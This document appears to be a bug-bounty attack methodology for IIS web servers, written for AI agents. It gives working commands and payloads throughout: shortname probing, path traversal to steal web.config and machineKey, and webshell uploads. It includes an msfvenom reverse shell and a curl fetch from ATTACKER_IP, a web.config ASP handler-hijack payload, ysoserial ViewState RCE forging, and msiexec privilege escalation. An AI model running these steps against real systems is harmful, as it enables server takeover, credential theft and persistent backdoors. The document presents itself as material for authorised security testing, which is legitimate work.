---
technology: "IIS (Internet Information Services)"
kind: bug-bounty-methodology
audience: ai-agent
family: windows
provenance: "field-grounded (63 evidence files: 15 with command-context chains — upload-hijack RCE, shortname recon, traversal-to-machineKey, ViewState forge, webshell delivery, kernel privesc — plus banner evidence across the rest) + upstream: Dalili tilde paper (secproject), Dalili 'web.config for fun & profit' (2014), MSRC MS10-065/MS10-070, CVE-2017-7269 advisories. Rewritten commands use lab-safe placeholders."
---

# IIS bug bounty methodology

Target model: an IIS web server (any version, overwhelmingly 7.5/8.5/10.0 today)
identified by banner or behavior, with some combination of content discovery,
file upload, config disclosure, or ASP.NET ViewState surfaces. Companion
overview: [[iis|IIS]].

## Triage table

| Surface | Gate | Pre-auth? | Payoff |
|---|---|---|---|
| Shortname 8.3 disclosure (tilde) | IIS, tilde not stripped | yes | Hidden file/dir names (first 6 chars + ext) — recon, Medium |
| web.config disclosure | traversal / backup files / static-handler misconfig | usually | Conn strings + `<machineKey>` — High; RCE via ViewState |
| Upload → handler hijack | writable web-reachable dir, upload allows any config/extension | usually | RCE — Critical |
| machineKey theft → ViewState deserialization | leaked validationKey+decryptionKey, ASP.NET WebForms | if key leaked | RCE — Critical |
| CVE-2017-7269 ExplodingCan | IIS 6.0 + WebDAV (Server 2003 R2) | yes | RCE — Critical |
| MS10-070 padding oracle (CVE-2010-3332) | unpatched 2010-era .NET 1.1–4.0 | yes | Web.config decryption, session forge — High |
| NTFS parser quirks (`;.jpg`, `::$DATA`, trailing dot) | upload denylist / static serving of scripts | yes | Source disclosure or upload bypass — Medium→Critical |

## Phase 0 — Fingerprint and version-pin

```bash
nmap -p 80,443,8080 -sV --script http-headers,http-title 198.51.100.10
# |_ http-server-header: Microsoft-IIS/10.0        <- version banner (default on)

curl -sI https://198.51.100.10/ | grep -iE 'server|x-powered-by|x-aspnet-version'
# Server: Microsoft-IIS/10.0
# X-Powered-By: ASP.NET    (or X-AspNet-Version: 4.0.30319 — managed code confirmed)

# aspnet_client at the root = ASP.NET wiring; classic recon marker
curl -s -o /dev/null -w "%{http_code}\n" https://198.51.100.10/aspnet_client/
```

Version → OS mapping (upstream, Microsoft lifecycle docs):

| Banner | OS generation | Engagement meaning |
|---|---|---|
| IIS/6.0 | Server 2003 (EOL) | ExplodingCan era; unpatched forever |
| IIS/7.5 | Server 2008 R2 | No Defender; kernel-exploit privesc likely (observed) |
| IIS/8.5 | Server 2012 R2 | Legacy but common on intranet apps |
| IIS/10.0 | Server 2016/2019/2022 | Current; hunt misconfig, not CVE |

Decision: banner version older than 8.5 → check Phase 5 CVEs first. Any version →
Phase 1 shortname scan (cheap, pre-auth).

## Phase 1 — Shortname 8.3 disclosure (tilde scan)

Disclosed 2010 (GET vector, Soroush Dalili & Ali Abbasnejad); newer builds remained
vulnerable via OPTIONS. The oracle distinguishes existence by status code:

```http
GET /*~1*/.aspx HTTP/1.1        -> IIS 6: 404 = shortname EXISTS, 400 = not
OPTIONS /*~1*/.aspx HTTP/1.1    -> newer: 404 = exists, 200 = not
GET /a*~1*/.aspx                -> 404: some file starts with "a"
GET /ab*~1*/.aspx               -> 400: second char is not "b"
GET /a%3f%3f%3f%3f%3f~1*/.aspx  -> 404: name is >= 6 chars (%3f = ? wildcard)
```

Automated (the observed default):

```bash
java -jar /opt/iis-shortname-scanner/iis_shortname_scanner.jar 2 20 \
  http://198.51.100.10:80/
# Output lines name short files/dirs, e.g.: TRANSF~1.ASP, UPLOAD~1
# Feed the 6 revealed chars + extension into a targeted wordlist:
#   transfer.aspx, uploadedfiles   (then confirm with dirsearch/gobuster)
```

Extras from the original paper: `::$Index_Allocation` appended to an
auth-protected directory (`/AuthNeeded::$Index_Allocation/*~1*/.aspx`) bypassed
Basic/Windows auth on affected builds to probe inside the folder; `::$data`
served file contents as text on IIS 6 and earlier (`.aspx::$DATA` = source
disclosure).

What it buys you: hidden upload panels, admin pages, and backup files that no
wordlist would find. What it does not: file contents — pair with Phase 2.

## Phase 2 — web.config hunting

`web.config` is per-directory XML holding handler maps, connection strings,
and `<machineKey>` — the single most valuable file on an ASP.NET target.

Forms seen in the field (all pre-auth, all simple HTTP):

```bash
# direct fetch + backups
curl -s https://198.51.100.10/web.config{,.old,.txt,.bak}
# dirsearch finding: "/web.config (Status: 200)"

# traversal in download parameters
curl -sv "https://198.51.100.10/Home/Download?fileName=../../Web.config"
curl -sv "https://198.51.100.10/?file=....//web.config"      # filtered-dot bypass
```

Extract in priority order:
1. `<machineKey validationKey=... decryptionKey=... validation="SHA1" decryption="AES">`
   → Phase 4 (ViewState RCE).
2. Connection strings (`connectionString=`) → DB creds, often reused.
3. `<handlers>` / `<httpHandlers>` blocks → which extensions execute here.
4. `appSettings` → internal paths, API keys.

Observed chains that ended here: traversal → validationKey;
`file=../web.config` → machineKey → RCE; arbitrary file read →
`web.config.old` → FTP/phish creds; traversal → DLL names →
source recovery for a deserialization bug.

## Phase 3 — Upload → ASP/ASPX execution

The execution ladder — try extensions in this order when a denylist exists
(`.cer`/`.asa`/`.soap`/`.ashx`/`.asmx` are mapped to script handlers on default
and legacy configs; `.config` only matters via Phase 3b):

```
shell.aspx  shell.asp  shell.ashx  shell.asmx  shell.asa  shell.cer  shell.soap
```

Parser/name quirks that beat extension checks on older IIS:
`shell.asp;.jpg` (semicolon = parameter delimiter; pre-IIS 7 executed the part
before it), `shell.asp.` (trailing dot), `shell.aspx::$DATA` (ADS served the
raw source on legacy builds — also a source-disclosure trick), mixed case.

Weaponizing sources: msfvenom format `-f aspx`
(`msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=443 -f aspx > sh.aspx`,
observed), the stock `cmdasp.aspx` webshell at
`/usr/share/webshells/aspx/cmdasp.aspx` (observed), or drop a Sliver/
meterpreter stage with `curl ATTACKER_IP:9001/shell.aspx -o c:\inetpub\wwwroot\shell.aspx`
(observed).

Observed variants worth copying:
- **Rename-after-upload** (observed): upload `shell.txt` (only `.txt` allowed),
  then use the app's own file-manager *Copy/Rename* to change the extension to
  `.aspx`. The application's filter and its manager disagree — that gap is the bug.
- **3b. web.config handler hijack** (observed — the canonical). When *only*
  `.config` uploads are accepted, upload a config that routes `*.config`
  through the classic ASP ISAPI DLL and embed ASP in the config itself:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<configuration>
  <system.webServer>
    <handlers accessPolicy="Read, Script, Write">
      <add name="web_config" path="*.config" verb="*"
           modules="IsapiModule"
           scriptProcessor="%windir%\system32\inetsrv\asp.dll"
           resourceType="Unspecified" requireAccess="Write"
           preCondition="bitness64" />
    </handlers>
    <security>
      <requestFiltering>
        <fileExtensions>
          <remove fileExtension=".config" />
        </fileExtensions>
        <hiddenSegments>
          <remove segment="web.config" />
        </hiddenSegments>
      </requestFiltering>
    </security>
  </system.webServer>
</configuration>
<%
  Set objShell = CreateObject("WScript.Shell")
  ' command execution inside web.config itself (Soroush Dalili 2014 technique)
%>
```

  Then request `/uploads/web.config` — the config executes as ASP. (Original
  research: "Upload a web-config File for Fun & Profit", 2014; weaponized PoC
  2018.) Handle with care: replacing the *application root's* live
  `web.config` breaks the site — plant it in the upload directory.

Post-exploitation note: `w3wp.exe` runs as the app-pool identity
(`IIS AppPool\<name>`), often with a writable `C:\inetpub\` and stale OS patch
level — the observed privesc from here is almost always kernel-exploit
suggestion (`multi/recon/local_exploit_suggester`) on 2008 R2-era boxes.

## Phase 4 — machineKey → ViewState deserialization RCE

When Phase 2 yields `<machineKey>` (or the target is an unpatched 2010-era
.NET — see padding oracle below), ASP.NET WebForms `__VIEWSTATE` becomes your
deserialization sink: forge a valid MAC using the leaked keys.

YSoSerial.Net under Linux (observed — verbatim workflow):

```bash
sudo apt install mono-complete wine winetricks -y
winetricks dotnet48
wine ysoserial.exe -p ViewState -g TypeConfuseDelegate -c "whoami" \
  --path="/portfolio" --apppath="/" \
  --validationalg="SHA1" --validationkey=<LEAKED_VALIDATIONKEY> \
  --decryptionalg="AES" --decryptionkey=<LEAKED_DECRYPTIONKEY> \
  --islegacy --isdebug
# --isdebug prints the calculated __VIEWSTATEGENERATOR; it must match the
# target page's — if not, adjust --path (page path) and --apppath until equal.
# Then send the base64 payload as __VIEWSTATE in the page's POST form.
```

Checks before burning hours: the page must actually post `__VIEWSTATE`;
`enableViewStateMac` must be true (it forges only with the key — that is the
point); target `<pages>` config may set `viewStateEncryptionMode` (then you
need decryptionKey too — you have it). Weak-key history: legacy
targets with RC4-era keys and known `ViewStateUserKey` fall to the same forge.

## Phase 5 — CVE history that still pays

| CVE / bulletin | What | Where it still lives |
|---|---|---|
| CVE-2017-7269 "ExplodingCan" | Stack overflow in WebDAV `ScStoragePathFromUrl`, IIS 6.0 on Server 2003 R2, via long `If: <http://` header in PROPFIND; exploited in the wild since 2016; Equation Group tool (Shadow Brokers). MSRC never patched (EOL OS) — 0patch micropatches exist | EOL boxes in acquired networks, OT/SCADA perimeters |
| MS10-070 / CVE-2010-3332 | ASP.NET padding oracle in WebResource.axd ScriptResource.axd encryption — decrypt ViewState/cookies, forge, read `web.config`. Patched Sep 2010; Windows 2000 permanently exposed | Anything still on .NET 1.1–4.0 unpatched — overlaps Phase 4 (padbuster-style tools) |
| MS10-065 / CVE-2010-2730 | RCE in IIS FastCGI request handling (HTTP request path); IIS 5.1–7.5 | Server 2003/2008 era again |
| CVE-2010-2731 | IIS 7.5 authentication heap overflow | same era |

Adjacent Windows-Installer techniques that show up on IIS boxes (these are OS
features, not IIS bugs — verified as delivery/privesc patterns in the field):
`msfvenom -f msi` payloads run via `msiexec /quiet /i reverse.msi` (observed)
and MSI *repair* abuse (`msiexec /fa` plus an opportunistic lock on an
installer log to hijack a SYSTEM repair — observed with a PDF24 installer).
A Windows Installer *transform* (`.mst`) is another vehicle for modifying
installed packages in scope-repair scenarios; no credible upstream "IIS MSI
Transform RCE" CVE exists — treat MSI work as post-foothold privesc, not an
IIS attack.

## Quick reference — command cheat sheet

```bash
# fingerprint
curl -sI https://198.51.100.10/ | grep -i server           # Microsoft-IIS/x.y
nmap -sV -p80,443 --script http-headers 198.51.100.10
# shortname
java -jar iis_shortname_scanner.jar 2 20 http://198.51.100.10/
curl -X OPTIONS -o /dev/null -w "%{http_code}\n" https://198.51.100.10/*~1*/.aspx
# config hunting
for f in web.config web.config.old web.config.txt; do
  curl -s -o /dev/null -w "%{http_code} $f\n" https://198.51.100.10/$f; done
# payload build
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=443 -f aspx -o sh.aspx
# viewstate forge (see Phase 4 for full flags)
wine ysoserial.exe -p ViewState -g TypeConfuseDelegate --islegacy --isdebug ...
```

## Tool mapping (prose)

Nmap and curl carry fingerprinting; the Java-based iis shortname scanner
(`iis_shortname_scanner.jar`, Soroush Dalili's irsdl/iis-shortname-scanner)
and Metasploit's `auxiliary/scanner/http/iis_shortname_scanner` automate the
tilde oracle; dirsearch and gobuster with an IIS extension list (`aspx,asp,
config,ashx,asa`) do content discovery; Burp Intruder fuzzes upload extension
denylists (the observed method scrapes the MSDN extension list for candidate
names); msfvenom builds aspx/msi payloads; YSoSerial.Net (run under wine or
on Windows) forges ViewState with a leaked machineKey; the Metasploit
explodingcan/WebDAV-overflow modules cover CVE-2017-7269; padbuster-style
tooling covers MS10-070 oracles.
